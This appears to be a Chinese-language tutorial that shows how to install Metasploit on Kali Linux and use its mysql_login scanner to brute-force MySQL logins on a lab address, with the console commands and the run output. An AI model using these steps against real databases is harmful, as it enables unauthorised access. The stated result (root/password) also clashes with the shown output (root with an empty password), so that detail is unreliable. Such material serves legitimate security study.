kali安装metasploit教程(kali默认已经安装了该工具,直接使用即可)：

安装命令：
```shell script
> sudo apt-get install metasploit-framework
```
开启命令：
```shell script
> msfconsole
```


#####################举例攻击MySQL:########################################
```shell script
msf6> search mysql    #1.搜索mysql有效模块

msf6> use auxiliary/scanner/mysql/mysql_login  #2.你选择一个模块使用

msf6 auxiliary(scanner/mysql/mysql_login) >    #3.use命令执行后，进入了该模块

msf6 auxiliary(scanner/mysql/mysql_login) > show options  #4.显示所有可用选项

msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.41.142  #5.设置主机选项

msf6 auxiliary(scanner/mysql/mysql_login) > set user_file /root/Desktop/usernames.txt  #6.设置渗透用户名

msf6 auxiliary(scanner/mysql/mysql_login) > set pass_file /root/Desktop/passwords.txt  #7.设置渗透密码

msf6 auxiliary(scanner/mysql/mysql_login) > exploit  #8.启动渗透攻击
```

从下面的渗透攻击的输出，可以看到，已测试出MySQL数据库服务器的用户名和密码分别是root和password
```text
[deprecated] I18n.enforce_available_locales will default to true in the future. If you really want to skip validation of your locale you can set I18n.enforce_available_locales = false to avoid this message.
[*] 192.168.41.142:3306 MYSQL - Found remote MySQL version 5.0.51a
[*] 192.168.41.142:3306 MYSQL - [01/40] - Trying username:'sa' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [02/40] - Trying username:'root' with password:"
[+] 192.168.41.142:3306 - SUCCESSFUL LOGIN 'root' : "
[*] 192.168.41.142:3306 MYSQL - [03/40] - Trying username:'bob' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [04/40] - Trying username:'ftp' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [05/40] - Trying username:'apache' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [06/40] - Trying username:'named' with password:"
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [07/40] - Trying username:'sa' with password:'sa'
[-] Access denied
[*] 192.168.41.142:3306 MYSQL - [35/40] - Trying username:'named' with password:'password'
[-] Access denied
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


